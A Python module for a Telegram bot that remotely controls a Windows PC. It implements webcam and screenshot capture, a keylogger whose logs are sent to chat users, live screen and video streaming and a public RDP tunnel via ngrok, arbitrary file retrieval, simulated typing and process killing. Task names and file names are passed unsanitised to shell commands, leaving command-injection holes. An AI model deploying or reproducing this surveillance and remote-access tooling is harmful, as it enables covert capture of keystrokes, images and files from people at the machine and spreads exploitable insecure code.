import socket
from werkzeug.utils import safe_join
import live_webserver as lw
import os
from dotenv import load_dotenv
import secrets
import pyscreenshot
import json
from subprocess import Popen, PIPE
import datetime
import cv2
from logger import Listener, key_handeler
import requests
from pynput.keyboard import Controller as key
import speech_recognition as sr
import pyttsx3
from pyngrok import ngrok
if(os.getenv("CHAT_BOT_ENABLED") != "False"):
    import ollama


class features:
    """
    A class to represent various features of a Telegram bot.

    Attributes:
        telegram_bot: An instance of the Telegram bot.
        admin_chat_id: The chat ID of the admin.
        api_key: The API key for the Telegram bot.
        admin_name: The name of the admin.
        ngrok_token: The token for Ngrok.
        pronoun: Pronoun used for the bot.
        ffmpegPathPrefix: Path prefix for ffmpeg.
        chat_id_file: ID of the chat file.
        photo_name: Name of the photo file.
        authorzed_users: Path to the authorized users JSON file.
        key_log_file: Path to the key logger file.
        fin: File content.
        random_f: Random string for authorization.
        fname: File name.
        file_message_id: ID of the file message.
        server_thread_state: State of the server thread.
        random: Random number for authorization.
        public_url: Public URL for the server.
        now: Current date and time.
        authorized: Authorization status.
        aut_chat_id: Authorized chat ID.
        pending: Pending authorization status.
        logging: Logging status.
        logger: Logger instance.
        screen_State: State of the screen.
        video_State: State of the video.
        language_model: Language model pipeline for text generation.
    """

    def __init__(self, telegram_bot):
        """


        Initializes the features class with the given Telegram bot instance.
        Loads environment variables and authorized users.

        Args:
            telegram_bot: An instance of the Telegram bot.
        """
        load_dotenv()
        self.admin_chat_id = os.getenv("ADMIN_CHAT_ID")
        self.api_key = os.getenv("API_KEY")
        self.admin_name = os.getenv("ADMIN_NAME")
        self.ngrok_token = os.getenv("NGROK_TOKEN")
        self.pronoun = os.getenv("PRONOUN")
        self.ffmpegPathPrefix = os.getenv("FFMPEG_PATH_PREFIX")
        self.rdp_port = os.getenv("RDP_PORT", "3389")
        self.rdp_active = False
        self.chat_bot_enabled=os.getenv("CHAT_BOT_ENABLED", "True").lower() in ("true", "1", "t")
        self.chat_id_file = 0
        self.photo_name = 'photo.png'
        self.authorzed_users = 'authorzed_Users/authorzed_Users.json'
        self.key_log_file = "KeyLoger.txt"
        self.fin = ''
        self.random_f = ''
        self.fname = ''
        self.file_message_id = ''
        self.server_thread_state = ''
        self.random = 1
        self.public_url = ''
        self.now = datetime.datetime.now()
        self.authorized = 0
        self.aut_chat_id = 0
        self.pending = 0
        self.logging = False
        self.logger = 0
        self.telegram_bot = telegram_bot
        file_found = False
        self.screen_State = False
        self.video_State = False
        self.chat_history = {}  # Dictionary to store chat history
        self.chat_mode = {}  # Dictionary to store chat modes

        while not file_found:
            try:
                with open(self.authorzed_users) as f:
                    self.auth_list = json.load(f)
                print(self.auth_list)
                file_found = True
            except FileNotFoundError:
                data = {'authorized': [{'chat_id': None, 'Name': None}]}
                with open(self.authorzed_users, 'w') as f:
                    json.dump(data, f, indent=2)

    def test_message(self):
        """
        Sends a test message to the admin with the IP configuration details.
        """
        i = 2
        while (i > 0):
            messag = Popen('ipconfig', shell=True, stdout=PIPE,
                           text=True).communicate()[0]
            self.telegram_bot.sendMessage(self.admin_chat_id, messag)
            i = i - 1

    def live_server(self, chat_id, first_name, last_name):
        """
        Starts or stops the live server based on the current state.

        Args:
            chat_id (int): The chat ID of the user.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
        """
        if(self.rdp_active):
            self.telegram_bot.sendMessage(chat_id, f"Cannot start/stop live server as RDP tunnel is running on the server")
            return None
        if self.server_thread_state == "ON" and not self.video_State and not self.screen_State:
            lw.stop_server()
            ngrok.kill()
            self.telegram_bot.sendMessage(chat_id, "video feed ended")
            self.server_thread_state = ""
            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
                self.telegram_bot.sendMessage(
                    self.admin_chat_id, f'''live video feed stopped by {first_name} {last_name}.''')
        else:
            lw.start_server_in_thread()
            tunnel = ngrok.connect(5000, 'http')
            self.public_url = str(tunnel).split('''"''')[1]
            self.server_thread_state = "ON"
        return None

    def send(self, chat_id, command, command_list, first_name, last_name):
        """
        Sends a document to the specified chat ID.

        Args:
            chat_id (int): The chat ID to send the document to.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
        """
        fp = command[len(command_list[0]) + 1:]
        self.telegram_bot.sendDocument(chat_id, open(fp, 'rb'))

    def video(self, chat_id, command, command_list, first_name, last_name):
        """
        Toggles the video state and manages the live server accordingly.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
        """
        print('hi')
        self.video_State = not self.video_State
        if self.video_State:
            if self.server_thread_state != "ON":
                _ = self.live_server(chat_id, first_name, last_name)
            self.telegram_bot.sendMessage(chat_id, f'''for live video feed visit
{self.public_url}''')
            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
                self.telegram_bot.sendMessage(self.admin_chat_id, f'''live video feed started by {first_name} {last_name} visit
{self.public_url}''')
        else:
            if not self.screen_State and not self.video_State:
                self.live_server(chat_id, first_name, last_name)
            else:
                self.telegram_bot.sendMessage(
                    chat_id, 'Cannot stop server as other services are running on the server')

    def screen(self, chat_id, command, command_list, first_name, last_name):
        """
        Toggles the screen state and manages the live server accordingly.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
        """
        self.screen_State = not self.screen_State
        if self.screen_State:
            if self.server_thread_state != "ON":
                self.live_server(chat_id, first_name, last_name)

            self.telegram_bot.sendMessage(chat_id, f'''for live Screen feed visit
{self.public_url}/screen''')
            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
                self.telegram_bot.sendMessage(self.admin_chat_id, f'''live Screen feed started by {first_name} {last_name} visit
{self.public_url}/screen''')
        else:
            if not self.screen_State and not self.video_State:
                self.live_server(chat_id, first_name, last_name)
            else:
                self.telegram_bot.sendMessage(
                    chat_id, 'Cannot stop server as other services are running on the server')

    def download_file(self, msg, key):
        """
        Downloads a file from a message and handles authorization.

        Args:
            msg (dict): The message containing the file.
            key (str): The key indicating the type of file.

        Returns:
            tuple: A tuple indicating if speech recognition was performed and the recognized text.
        """
        key_list = ["text", "voice", "photo", "video", "document"]
        chat_id = msg['chat']['id']
        self.file_message_id = msg['message_id']
        print(self.file_message_id)
        self.chat_id_file = chat_id
        authorized = False
        if self.pending == 0 or chat_id != self.aut_chat_id:
            for i in self.auth_list['authorized']:
                if i['chat_id'] == chat_id:
                    authorized = True
                    break
        if authorized:
            if key == key_list[4]:
                self.fname = msg[key]["file_name"]
            if key == "photo":
                fid = msg[key][3]["file_id"]
            else:
                fid = msg[key]["file_id"]
            resp = requests.get(
                url=f"https://api.telegram.org/bot{self.api_key}/getFile?file_id={fid}")
            resp = resp.json()
            if resp["ok"] == False:
                self.telegram_bot.sendMessage(chat_id, resp["description"])
                return False, ""
            fp = resp["result"]["file_path"]
            if key != key_list[4]:
                self.fname = fp[fp.index('/')+1:]
            self.fin = requests.get(
                url=f"https://api.telegram.org/file/bot{self.api_key}/{fp}", allow_redirects=True)
            speach_recon = False
            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
                if self.fname.endswith(".oga"):
                    with open(safe_join('downloads', self.fname), "wb") as f:
                        f.write(self.fin.content)
                    speach_recon, text = self.recognise_speech_and_do(
                        chat_id, self.fname, f"{msg['chat']['first_name']} {msg['chat']['last_name']}")
                    return speach_recon, text
                else:
                    print(self.admin_chat_id)
                    self.random_f = str(secrets.token_hex(32)).upper()
                    text = ''
                    self.telegram_bot.sendMessage(
                        chat_id, f'{self.admin_name} will tell you the authorization code')
                    self.telegram_bot.sendMessage(
                        self.admin_chat_id, f"do you want to receive {key} send a key to {msg['chat']['first_name']} {msg['chat']['last_name']} of ")
                    self.telegram_bot.sendMessage(
                        self.admin_chat_id, self.random_f)
                    return speach_recon, text
            else:
                text = ''
                with open(safe_join('downloads', self.fname), "wb") as f:
                    f.write(self.fin.content)
                if self.fname.endswith(".oga"):
                    speach_recon, text = self.recognise_speech_and_do(
                        chat_id, self.fname, f"{msg['chat']['first_name']} {msg['chat']['last_name']}")

                self.chat_id_file = 0
                self.fin = ""
                self.telegram_bot.sendMessage(
                    chat_id, f'file saved as {self.fname}')
                self.fname = ""

                self.file_message_id = "aa"
                return speach_recon, text

    def recognise_speech_and_do(self, chat_id, fname, name):
        """
        Recognizes speech from an audio file and sends the text to the user.

        Args:
            chat_id (int): The chat ID of the user.
            fname (str): The name of the audio file.
            name (str): The name of the user.

        Returns:
            tuple: A tuple indicating if speech recognition was successful and the recognized text.
        """
        convert_command = f'{self.ffmpegPathPrefix}ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
        print(convert_command)
        message = Popen(convert_command, shell=True,
                        stdout=PIPE, text=True).communicate()[0]
        text = ""
        print(message)
        speach = sr.Recognizer()
        try:
            with sr.AudioFile(f"downloads/{fname}.wav") as source:
                # listen for the data (load audio to memory)
                audio_data = speach.record(source)
                # recognize (convert from speech to text)
                text = speach.recognize_google(audio_data)
            os.remove(f"downloads/{fname}.wav")
            os.remove(f"downloads/{fname}")
        except sr.UnknownValueError:
            self.telegram_bot.sendMessage(
                chat_id, f"Didn't get what you said {name}")

            os.remove(f"downloads/{fname}.wav")
            os.remove(f"downloads/{fname}")
            print('deleted')
            return False , text
        print('deleted')
        print(text)
        self.telegram_bot.sendMessage(chat_id, f'you said {text}')
        self.chat_id_file = 0
        self.fin = ""
        fname = ""
        self.file_message_id = "aa"
        return True, text

    def speak(self, chat_id, command, command_list, first_name, last_name):
        """
        Converts text to speech and plays it.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The text command to be spoken.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
        """
        speak = pyttsx3.init()
        x = len(command_list[0])
        speak.say(command[x:])
        speak.runAndWait()

    def save_file_in_fin(self, chat_id):
        """
        Saves the file content in the specified location.

        Args:
            chat_id (int): The chat ID of the user.
        """
        with open(safe_join('downloads', self.fname), "wb") as f:
            f.write(self.fin.content)
        self.chat_id_file = 0
        self.fin = ""
        self.telegram_bot.sendMessage(chat_id, f'file saved as {self.fname}')
        self.fname = ""
        self.file_message_id = "aa"

    def take_screenshot(self, chat_id, command, command_list, first_name, last_name):
        """
        Takes a screenshot and sends it to the specified chat ID.

        Args:
            chat_id (int): The chat ID to send the screenshot to.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
        """
        print("scr")
        img = pyscreenshot.grab()
        img.save('screen.png')
        self.telegram_bot.sendPhoto(chat_id, photo=open("screen.png", 'rb'))
        os.remove("screen.png")

    def kill_task(self, chat_id, command, command_list, first_name, last_name):
        """
        Kills a task based on the provided command.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
        """
        command = f'''Taskkill /f /Im "{command_list[1]}.exe" /t'''
        if len(command_list) == 2:
            message = Popen(command, shell=True,
                            stdout=PIPE, text=True).communicate()[0]
        else:
            message = 'Invalid command'
        self.telegram_bot.sendMessage(chat_id, message)

    def keyboard_type(self, chat_id, command, command_list, first_name, last_name):
        """
        Simulates keyboard typing of the given command.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command to be typed.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
        """
        keyboard = key()
        x = len(command_list[0])
        keyboard.type(command[x+1:])

    def take_photo(self, chat_id, command, command_list, first_name, last_name):
        """
        Takes a photo using the webcam and sends it to the specified chat ID.

        Args:
            chat_id (int): The chat ID to send the photo to.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
        """
        vod = cv2.VideoCapture(0)
        if not vod.isOpened():
            self.telegram_bot.sendMessage(
                chat_id, "No camera attached or accessible.")
            return

        ret, img = vod.read()
        vod.release()

        if ret:
            cv2.imwrite(self.photo_name, img)
            self.telegram_bot.sendPhoto(
                chat_id, photo=open(self.photo_name, 'rb'))
            os.remove(self.photo_name)
        else:
            self.telegram_bot.sendMessage(chat_id, "Failed to capture image.")

    def key_logger(self, chat_id, command, command_list, first_name, last_name):
        """
        Starts or stops the key logger based on the current logging state.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
        """
        if not self.logging:
            self.logger = Listener(on_press=key_handeler)
            self.logger.start()
            self.telegram_bot.sendMessage(chat_id, "Key logger started")
            self.logging = True
            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
                self.telegram_bot.sendMessage(
                    self.admin_chat_id, f'''Key logger started by {first_name} {last_name}.''')
        else:
            self.logger.stop()
            self.telegram_bot.sendMessage(chat_id, "Key logger stopped")
            self.telegram_bot.sendDocument(
                chat_id, document=open(self.key_log_file, "rb"))
            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
                self.telegram_bot.sendMessage(self.admin_chat_id, f'''Key logger stopped by {first_name} {last_name},
here is log''')
                self.telegram_bot.sendDocument(
                    self.admin_chat_id, document=open(self.key_log_file, "rb"))
            x = open(self.key_log_file, "w")
            x.close()
            os.remove(self.key_log_file)
            self.logging = False

    def send_first_auth_code(self, chat_id, name):
        """
        Sends the first authorization code to the user.

        Args:
            chat_id (int): The chat ID of the user.
            name (str): The name of the user.
        """
        self.random = str(secrets.token_hex(6)).upper()
        print(self.random, type(self.random))

        self.telegram_bot.sendMessage(self.admin_chat_id, self.random)
        self.telegram_bot.sendMessage(self.admin_chat_id, str(
            'do you want to authorize ' + name))

        self.telegram_bot.sendMessage(
            chat_id, f'you are not an authorized user please contact {self.admin_name}')
        self.telegram_bot.sendMessage(
            chat_id, f'{self.pronoun} will tell you the authorization code')
        self.aut_chat_id = chat_id
        self.pending = 1
        print(self.pending, self.aut_chat_id)

    def receive_auth_code(self, name, chat_id, command):
        """
        Receives and verifies the authorization code from the user.

        Args:
            name (str): The name of the user.
            chat_id (int): The chat ID of the user.
            command (str): The authorization code provided by the user.
        """
        print(self.random)
        if command == self.random:
            self.telegram_bot.sendMessage(
                chat_id, str('you are authorized ' + name))
            new_guy = {'chat_id': chat_id, 'Name': name}
            print(new_guy)
            self.auth_list['authorized'].append(new_guy)
            print(self.auth_list)
            self.pending = 0
            with open(self.authorzed_users, 'w') as f:
                json.dump(self.auth_list, f, indent=2)
                f.close()
        else:
            self.telegram_bot.sendMessage(chat_id, 'sorry invalid code')

    def record_message(self, chat_id, message):
        """
        Records a message in the chat history for the given chat_id.

        Args:
            chat_id (int): The chat ID of the user.
            message (str): The message to be recorded.
        """
        if chat_id not in self.chat_history:
            self.chat_history[chat_id] = []
        self.chat_history[chat_id].append(message)

    def get_chat_history(self, chat_id):
        """
        Retrieves the chat history for the given chat_id.

        Args:
            chat_id (int): The chat ID of the user.

        Returns:
            list: The chat history for the given chat_id.
        """
        return self.chat_history.get(chat_id, [])

    def getChatMode(self, chat_id):
        """
        Retrieves the chat mode for the given chat_id.

        Args:
            chat_id (int): The chat ID of the user.

        Returns:
            str: The chat mode for the given chat_id.
        """
        return self.chat_mode.get(chat_id, "non_ai")

    def setChatMode(self, chat_id, isAi):
        """
        Sets the chat mode for the given chat_id.

        Args:
            chat_id (int): The chat ID of the user.
            mode (str): The chat mode to be set.
        """
        self.chat_mode[chat_id] = 'ai' if isAi else 'non_ai'

    def run_language_model(self, chat_id, command, list_command, first_name, last_name):
        """
        Runs a language model to generate a response based on the user's input.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command received from the user.
            list_command (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
        """
        if self.chat_bot_enabled == False:
            self.telegram_bot.sendMessage(
                chat_id, "Chat bot is disabled. Please enable it to use this feature.")
            return
        user_name = f"{first_name} {last_name}"
        prompt = f"{user_name} says: {' '.join(list_command[1:])}"

        messages = [
            {"role": "system", "content": "You are a helpful assistant."},
            *[
                {"role": "user", "content": m}
                for m in self.get_chat_history(chat_id)
            ],
            {"role": "user", "content": prompt}
        ]
        result = ollama.chat(model="llama3", messages=messages)
        response = ''.join(result['message']['content'])
        self.record_message(chat_id, f"User: {prompt}")
        self.record_message(chat_id, f"Bot: {response}")
        self.telegram_bot.sendMessage(chat_id, response, parse_mode='Markdown')

    def list_users(self, chat_id, command, list_command, first_name, last_name):
        """
        Lists all authorized users and sends the list to the requesting user.

        Args:
            chat_id (int): The chat ID of the user requesting the list.

        Returns:
            None
        """
        if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
            self.telegram_bot.sendMessage(
                chat_id, "You are not authorized to use this command.")
            return

        user_list = "Authorized Users:\n"
        for user in self.auth_list['authorized']:
            if user['chat_id'] is None or user['chat_id'] == int(self.admin_chat_id):
                continue
            user_list += f"Name: {user['Name']}, Chat ID:`{user['chat_id']}`\n"

        self.telegram_bot.sendMessage(
            chat_id, user_list, parse_mode='MarkdownV2')

    def kick_user(self, chat_id, command, list_command, first_name, last_name):
        """
        Removes a user from the authorized list and notifies them.

        Args:
            chat_id (int): The chat ID of the user to be removed.

        Returns:
            None
        """
        if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
            self.telegram_bot.sendMessage(
                chat_id, "You are not authorized to use this command.")
            return
        remove_chat_id = list_command[1] if len(list_command) > 1 else None
        if remove_chat_id and remove_chat_id.isdigit():
            remove_chat_id = int(remove_chat_id)
        else:
            remove_chat_id = None
        if not remove_chat_id:
            self.telegram_bot.sendMessage(
                chat_id, "Please provide the chat ID of the user to remove.")
            return
        user_to_remove = next(
            (user for user in self.auth_list['authorized'] if user['chat_id'] == remove_chat_id), None)
        if user_to_remove:
            self.auth_list['authorized'].remove(user_to_remove)
            with open(self.authorzed_users, 'w') as f:
                json.dump(self.auth_list, f, indent=2)
            self.telegram_bot.sendMessage(
                self.admin_chat_id, f"User {user_to_remove['Name']} has been kicked.")
        else:
            self.telegram_bot.sendMessage(
                self.admin_chat_id, "User not found in the authorized list.")

    def start_stop_rdp_tunnel(self, chat_id, command, list_command, first_name, last_name):
        # Set up ngrok tunnel
        if(self.rdp_active):
            ngrok.kill()
            self.rdp_active = False
            self.telegram_bot.sendMessage(chat_id, f"RDP tunnel stopped")
            if(not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id))):
                self.telegram_bot.sendMessage(self.admin_chat_id, f'''RDP tunnel stopped by {first_name} {last_name}''')
            return
        elif(self.video_State):
            self.telegram_bot.sendMessage(chat_id, f"Cannot start RDP tunnel as other video feed is running on the server")
            return
        elif(self.screen_State):
                self.telegram_bot.sendMessage(chat_id, f"Cannot start RDP tunnel as other screen feed is running on the server")
                return
        ngrok_tunnel = ngrok.connect(self.rdp_port, "tcp")

        self.rdp_active = True
        # Get tunnel information
        tunnel_domain = ngrok_tunnel.public_url.split("/")[2].split(":")[0]
        #get ip address from domain:port
        print(ngrok_tunnel.public_url.split("/"))
        tunnel_ip = socket.gethostbyname(tunnel_domain)
        tunnel_port = ngrok_tunnel.public_url.split(":")[2]
        self.telegram_bot.sendMessage(chat_id, f"RDP tunnel started at `{tunnel_ip}:{tunnel_port}`", parse_mode='MarkdownV2')
        if(not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id))):
            self.telegram_bot.sendMessage(self.admin_chat_id, f'''RDP tunnel started by {first_name} {last_name}''')
           
            
